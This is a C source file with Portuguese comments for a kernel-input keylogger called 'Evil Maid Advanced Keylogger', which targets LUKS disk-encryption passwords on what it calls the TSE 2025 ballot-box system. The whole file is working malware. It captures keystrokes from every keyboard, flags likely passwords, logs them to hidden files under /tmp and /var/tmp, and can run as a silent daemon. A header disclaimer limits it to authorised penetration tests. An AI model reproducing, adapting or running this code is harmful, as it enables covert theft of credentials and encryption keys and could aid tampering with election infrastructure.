/*
 * Evil Maid Advanced Keylogger
 * TSE 2025 Ballot-Box TPU System LUKS Penetration Testing
 * 
 * Kernel-level keylogger for credential capture
 * Compilar: gcc -o keylogger keylogger.c -lpthread
 * 
 * AVISO: SOMENTE PARA TESTES AUTORIZADOS DE PENETRAÇÃO!
 * USO NÃO AUTORIZADO É CRIME!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <stdarg.h>
#include <linux/input.h>
#include <dirent.h>

// Definições auxiliares para manipulação de bits
#ifndef BITS_PER_LONG
#define BITS_PER_LONG (sizeof(long) * 8)
#endif
#ifndef BITS_TO_LONGS
#define BITS_TO_LONGS(nr) (((nr) + BITS_PER_LONG - 1) / BITS_PER_LONG)
#endif

static inline int test_bit(int nr, const unsigned long *addr) {
    return ((1UL << (nr % BITS_PER_LONG)) & (addr[nr / BITS_PER_LONG])) != 0;
}

#define MAX_DEVICES 10
#define LOG_FILE "/tmp/.keylog"
#define BACKUP_LOG_FILE "/var/tmp/.keylog_backup"
#define MAX_LOG_SIZE 1024 * 1024  // 1MB
#define BUFFER_SIZE 1024

// Estrutura para armazenar informações do dispositivo
struct input_device {
    int fd;
    char name[256];
    char path[256];
};

// Variáveis globais
static struct input_device devices[MAX_DEVICES];
static int device_count = 0;
static FILE *log_file = NULL;
static int running = 1;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;

// Mapeamento de teclas para strings
static const char *key_names[] = {
    [KEY_ESC] = "[ESC]",
    [KEY_1] = "1",
    [KEY_2] = "2",
    [KEY_3] = "3",
    [KEY_4] = "4",
    [KEY_5] = "5",
    [KEY_6] = "6",
    [KEY_7] = "7",
    [KEY_8] = "8",
    [KEY_9] = "9",
    [KEY_0] = "0",
    [KEY_MINUS] = "-",
    [KEY_EQUAL] = "=",
    [KEY_BACKSPACE] = "[BACKSPACE]",
    [KEY_TAB] = "[TAB]",
    [KEY_Q] = "q",
    [KEY_W] = "w",
    [KEY_E] = "e",
    [KEY_R] = "r",
    [KEY_T] = "t",
    [KEY_Y] = "y",
    [KEY_U] = "u",
    [KEY_I] = "i",
    [KEY_O] = "o",
    [KEY_P] = "p",
    [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]",
    [KEY_ENTER] = "\n",
    [KEY_LEFTCTRL] = "[CTRL]",
    [KEY_A] = "a",
    [KEY_S] = "s",
    [KEY_D] = "d",
    [KEY_F] = "f",
    [KEY_G] = "g",
    [KEY_H] = "h",
    [KEY_J] = "j",
    [KEY_K] = "k",
    [KEY_L] = "l",
    [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`",
    [KEY_LEFTSHIFT] = "[SHIFT]",
    [KEY_BACKSLASH] = "\\",
    [KEY_Z] = "z",
    [KEY_X] = "x",
    [KEY_C] = "c",
    [KEY_V] = "v",
    [KEY_B] = "b",
    [KEY_N] = "n",
    [KEY_M] = "m",
    [KEY_COMMA] = ",",
    [KEY_DOT] = ".",
    [KEY_SLASH] = "/",
    [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_KPASTERISK] = "*",
    [KEY_LEFTALT] = "[ALT]",
    [KEY_SPACE] = " ",
    [KEY_CAPSLOCK] = "[CAPS]",
    [KEY_F1] = "[F1]",
    [KEY_F2] = "[F2]",
    [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]",
    [KEY_F5] = "[F5]",
    [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]",
    [KEY_F8] = "[F8]",
    [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]",
    [KEY_NUMLOCK] = "[NUM]",
    [KEY_SCROLLLOCK] = "[SCROLL]",
    [KEY_KP7] = "7",
    [KEY_KP8] = "8",
    [KEY_KP9] = "9",
    [KEY_KPMINUS] = "-",
    [KEY_KP4] = "4",
    [KEY_KP5] = "5",
    [KEY_KP6] = "6",
    [KEY_KPPLUS] = "+",
    [KEY_KP1] = "1",
    [KEY_KP2] = "2",
    [KEY_KP3] = "3",
    [KEY_KP0] = "0",
    [KEY_KPDOT] = ".",
    [KEY_F11] = "[F11]",
    [KEY_F12] = "[F12]",
    [KEY_KPENTER] = "\n",
    [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_KPSLASH] = "/",
    [KEY_SYSRQ] = "[SYSRQ]",
    [KEY_RIGHTALT] = "[ALT]",
    [KEY_HOME] = "[HOME]",
    [KEY_UP] = "[UP]",
    [KEY_PAGEUP] = "[PGUP]",
    [KEY_LEFT] = "[LEFT]",
    [KEY_RIGHT] = "[RIGHT]",
    [KEY_END] = "[END]",
    [KEY_DOWN] = "[DOWN]",
    [KEY_PAGEDOWN] = "[PGDN]",
    [KEY_INSERT] = "[INS]",
    [KEY_DELETE] = "[DEL]"
};

// Função para obter timestamp
char *get_timestamp() {
    static char timestamp[32];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", tm_info);
    return timestamp;
}

// Função para inicializar o arquivo de log
int init_log_file() {
    log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        log_file = fopen(BACKUP_LOG_FILE, "a");
        if (!log_file) {
            fprintf(stderr, "Erro ao abrir arquivo de log\n");
            return -1;
        }
    }
    
    // Escrever cabeçalho
    fprintf(log_file, "\n%s EVIL MAID KEYLOGGER INICIADO\n", get_timestamp());
    fprintf(log_file, "===========================================\n");
    fflush(log_file);
    
    return 0;
}

// Função para rotacionar log se muito grande
void rotate_log_if_needed() {
    if (!log_file) return;
    
    struct stat st;
    if (fstat(fileno(log_file), &st) == 0 && st.st_size > MAX_LOG_SIZE) {
        fclose(log_file);
        
        // Backup do log atual
        char backup_name[256];
        snprintf(backup_name, sizeof(backup_name), "%s.%ld", LOG_FILE, time(NULL));
        rename(LOG_FILE, backup_name);
        
        // Reabrir novo log
        init_log_file();
    }
}

// Função para log seguro com mutex
void safe_log(const char *format, ...) {
    if (!log_file) return;
    
    pthread_mutex_lock(&log_mutex);
    
    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);
    
    fflush(log_file);
    rotate_log_if_needed();
    
    pthread_mutex_unlock(&log_mutex);
}

// Função para detectar se uma tecla é modificadora
int is_modifier_key(int code) {
    switch (code) {
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL:
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
        case KEY_LEFTALT:
        case KEY_RIGHTALT:
        case KEY_CAPSLOCK:
        case KEY_NUMLOCK:
        case KEY_SCROLLLOCK:
            return 1;
        default:
            return 0;
    }
}

// Função para detectar padrões de senha
int detect_password_pattern(const char *buffer, int len) {
    // Procurar por padrões típicos de senha
    const char *password_indicators[] = {
        "password", "senha", "passwd", "pwd", "pin", "luks", "crypt"
    };
    
    for (int i = 0; i < sizeof(password_indicators) / sizeof(password_indicators[0]); i++) {
        if (strstr(buffer, password_indicators[i])) {
            return 1;
        }
    }
    
    // Detectar sequências longas sem espaços (possíveis senhas)
    int consecutive_chars = 0;
    for (int i = 0; i < len; i++) {
        if (buffer[i] != ' ' && buffer[i] != '\n' && buffer[i] != '\t') {
            consecutive_chars++;
            if (consecutive_chars > 8) {
                return 1;
            }
        } else {
            consecutive_chars = 0;
        }
    }
    
    return 0;
}

// Função para processar eventos de teclado
void process_keyboard_event(struct input_event *event, const char *device_name) {
    static char key_buffer[BUFFER_SIZE] = {0};
    static int buffer_pos = 0;
    static int shift_pressed = 0;
    static int ctrl_pressed = 0;
    static int alt_pressed = 0;
    
    if (event->type != EV_KEY) return;
    
    // Apenas processar teclas pressionadas
    if (event->value != 1) {
        // Tecla liberada - resetar modificadores
        if (event->code == KEY_LEFTSHIFT || event->code == KEY_RIGHTSHIFT) {
            shift_pressed = 0;
        } else if (event->code == KEY_LEFTCTRL || event->code == KEY_RIGHTCTRL) {
            ctrl_pressed = 0;
        } else if (event->code == KEY_LEFTALT || event->code == KEY_RIGHTALT) {
            alt_pressed = 0;
        }
        return;
    }
    
    // Atualizar estado dos modificadores
    switch (event->code) {
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            shift_pressed = 1;
            break;
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL:
            ctrl_pressed = 1;
            break;
        case KEY_LEFTALT:
        case KEY_RIGHTALT:
            alt_pressed = 1;
            break;
    }
    
    const char *key_str = NULL;
    char temp_str[32] = {0};
    
    // Processar tecla
    if (event->code < sizeof(key_names) / sizeof(key_names[0]) && key_names[event->code]) {
        key_str = key_names[event->code];
        
        // Aplicar shift para letras
        if (shift_pressed && strlen(key_str) == 1 && key_str[0] >= 'a' && key_str[0] <= 'z') {
            temp_str[0] = key_str[0] - 'a' + 'A';
            temp_str[1] = '\0';
            key_str = temp_str;
        }
        // Aplicar shift para números e símbolos
        else if (shift_pressed) {
            switch (event->code) {
                case KEY_1: key_str = "!"; break;
                case KEY_2: key_str = "@"; break;
                case KEY_3: key_str = "#"; break;
                case KEY_4: key_str = "$"; break;
                case KEY_5: key_str = "%"; break;
                case KEY_6: key_str = "^"; break;
                case KEY_7: key_str = "&"; break;
                case KEY_8: key_str = "*"; break;
                case KEY_9: key_str = "("; break;
                case KEY_0: key_str = ")"; break;
                case KEY_MINUS: key_str = "_"; break;
                case KEY_EQUAL: key_str = "+"; break;
                case KEY_LEFTBRACE: key_str = "{"; break;
                case KEY_RIGHTBRACE: key_str = "}"; break;
                case KEY_SEMICOLON: key_str = ":"; break;
                case KEY_APOSTROPHE: key_str = "\""; break;
                case KEY_GRAVE: key_str = "~"; break;
                case KEY_BACKSLASH: key_str = "|"; break;
                case KEY_COMMA: key_str = "<"; break;
                case KEY_DOT: key_str = ">"; break;
                case KEY_SLASH: key_str = "?"; break;
            }
        }
    } else {
        // Tecla desconhecida
        snprintf(temp_str, sizeof(temp_str), "[KEY_%d]", event->code);
        key_str = temp_str;
    }
    
    // Adicionar modificadores ao log se necessário
    char full_key[128] = {0};
    if (ctrl_pressed && alt_pressed && !is_modifier_key(event->code)) {
        snprintf(full_key, sizeof(full_key), "[CTRL+ALT+%s]", key_str);
        key_str = full_key;
    } else if (ctrl_pressed && !is_modifier_key(event->code)) {
        snprintf(full_key, sizeof(full_key), "[CTRL+%s]", key_str);
        key_str = full_key;
    } else if (alt_pressed && !is_modifier_key(event->code)) {
        snprintf(full_key, sizeof(full_key), "[ALT+%s]", key_str);
        key_str = full_key;
    }
    
    // Adicionar ao buffer
    int key_len = strlen(key_str);
    if (buffer_pos + key_len < BUFFER_SIZE - 1) {
        strcpy(key_buffer + buffer_pos, key_str);
        buffer_pos += key_len;
        key_buffer[buffer_pos] = '\0';
    }
    
    // Log imediato com timestamp para teclas especiais
    if (is_modifier_key(event->code) || strlen(key_str) > 1) {
        safe_log("%s [%s] %s\n", get_timestamp(), device_name, key_str);
    }
    
    // Processar buffer quando houver nova linha ou buffer cheio
    if (event->code == KEY_ENTER || buffer_pos >= BUFFER_SIZE - 100) {
        if (buffer_pos > 0) {
            // Detectar possíveis senhas
            if (detect_password_pattern(key_buffer, buffer_pos)) {
                safe_log("%s [%s] POSSÍVEL SENHA: %s\n", get_timestamp(), device_name, key_buffer);
            } else {
                safe_log("%s [%s] %s", get_timestamp(), device_name, key_buffer);
            }
            
            // Resetar buffer
            memset(key_buffer, 0, BUFFER_SIZE);
            buffer_pos = 0;
        }
    }
}

// Função para thread de monitoramento de dispositivo
void *monitor_device(void *arg) {
    struct input_device *dev = (struct input_device *)arg;
    struct input_event event;
    ssize_t bytes;
    
    printf("Monitorando dispositivo: %s (%s)\n", dev->name, dev->path);
    safe_log("%s DISPOSITIVO CONECTADO: %s (%s)\n", get_timestamp(), dev->name, dev->path);
    
    while (running) {
        bytes = read(dev->fd, &event, sizeof(event));
        
        if (bytes == sizeof(event)) {
            process_keyboard_event(&event, dev->name);
        } else if (bytes == -1 && errno != EAGAIN) {
            // Dispositivo desconectado ou erro
            safe_log("%s DISPOSITIVO DESCONECTADO: %s\n", get_timestamp(), dev->name);
            break;
        }
        
        usleep(1000); // 1ms delay para evitar uso excessivo de CPU
    }
    
    close(dev->fd);
    return NULL;
}

// Função para verificar se um dispositivo é um teclado
int is_keyboard_device(const char *device_path) {
    int fd = open(device_path, O_RDONLY);
    if (fd == -1) return 0;
    
    unsigned long evbit = 0;
    unsigned long keybit[32] = {0}; // Buffer fixo suficiente para KEY_CNT
    
    // Verificar se suporta eventos de teclado
    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) >= 0) {
        if (evbit & (1 << EV_KEY)) {
            // Verificar se tem teclas alfanuméricas
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) >= 0) {
                // Verificar algumas teclas básicas
                if (test_bit(KEY_A, keybit) && test_bit(KEY_S, keybit) && 
                    test_bit(KEY_D, keybit) && test_bit(KEY_F, keybit)) {
                    close(fd);
                    return 1;
                }
            }
        }
    }
    
    close(fd);
    return 0;
}

// Função para descobrir dispositivos de entrada
int discover_input_devices() {
    DIR *dir;
    struct dirent *entry;
    char device_path[256];
    char device_name[256];
    int fd;
    
    dir = opendir("/dev/input");
    if (!dir) {
        perror("Erro ao abrir /dev/input");
        return -1;
    }
    
    device_count = 0;
    
    while ((entry = readdir(dir)) != NULL && device_count < MAX_DEVICES) {
        if (strncmp(entry->d_name, "event", 5) != 0) continue;
        
        snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
        
        if (!is_keyboard_device(device_path)) continue;
        
        fd = open(device_path, O_RDONLY | O_NONBLOCK);
        if (fd == -1) continue;
        
        // Obter nome do dispositivo
        if (ioctl(fd, EVIOCGNAME(sizeof(device_name)), device_name) < 0) {
            strcpy(device_name, "Unknown");
        }
        
        // Armazenar informações do dispositivo
        devices[device_count].fd = fd;
        strcpy(devices[device_count].name, device_name);
        strcpy(devices[device_count].path, device_path);
        
        printf("Encontrado teclado: %s (%s)\n", device_name, device_path);
        device_count++;
    }
    
    closedir(dir);
    return device_count;
}

// Handler de sinal para encerramento limpo
void signal_handler(int sig) {
    printf("\nRecebido sinal %d. Encerrando...\n", sig);
    running = 0;
}

// Função para se tornar daemon
void daemonize() {
    pid_t pid = fork();
    
    if (pid < 0) {
        perror("Erro no fork");
        exit(1);
    }
    
    if (pid > 0) {
        // Processo pai - terminar
        printf("Keylogger iniciado como daemon (PID: %d)\n", pid);
        exit(0);
    }
    
    // Processo filho
    setsid();
    if (chdir("/") != 0) {
        // Ignorar erro se não conseguir mudar diretório
    }
    
    // Fechar file descriptors padrão
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Reabrir para /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);
}

// Função principal
int main(int argc, char *argv[]) {
    pthread_t threads[MAX_DEVICES];
    int daemon_mode = 0;
    
    printf("Evil Maid Advanced Keylogger v2.0\n");
    printf("TSE 2025 Ballot-Box LUKS Penetration Testing\n");
    printf("========================================\n\n");
    
    // Verificar argumentos
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--daemon") == 0) {
            daemon_mode = 1;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("Uso: %s [-d|--daemon] [-h|--help]\n", argv[0]);
            printf("  -d, --daemon  Executar como daemon\n");
            printf("  -h, --help    Mostrar esta ajuda\n\n");
            printf("AVISO: Use apenas em sistemas autorizados para teste!\n");
            return 0;
        }
    }
    
    // Verificar se está rodando como root
    if (geteuid() != 0) {
        fprintf(stderr, "ERRO: Este programa precisa rodar como root para acessar /dev/input\n");
        return 1;
    }
    
    // Instalar handlers de sinal
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    
    // Inicializar log
    if (init_log_file() != 0) {
        return 1;
    }
    
    // Descobrir dispositivos de teclado
    if (discover_input_devices() <= 0) {
        fprintf(stderr, "ERRO: Nenhum dispositivo de teclado encontrado\n");
        return 1;
    }
    
    // Modo daemon se solicitado
    if (daemon_mode) {
        daemonize();
    }
    
    // Criar threads para monitorar cada dispositivo
    for (int i = 0; i < device_count; i++) {
        if (pthread_create(&threads[i], NULL, monitor_device, &devices[i]) != 0) {
            perror("Erro ao criar thread");
            running = 0;
            break;
        }
    }
    
    if (!daemon_mode) {
        printf("\nKeylogger ativo. Pressione Ctrl+C para parar.\n");
        printf("Log sendo salvo em: %s\n\n", LOG_FILE);
    }
    
    // Aguardar threads terminarem
    for (int i = 0; i < device_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Cleanup
    if (log_file) {
        safe_log("%s EVIL MAID KEYLOGGER ENCERRADO\n", get_timestamp());
        fclose(log_file);
    }
    
    if (!daemon_mode) {
        printf("Keylogger encerrado.\n");
    }
    
    return 0;
}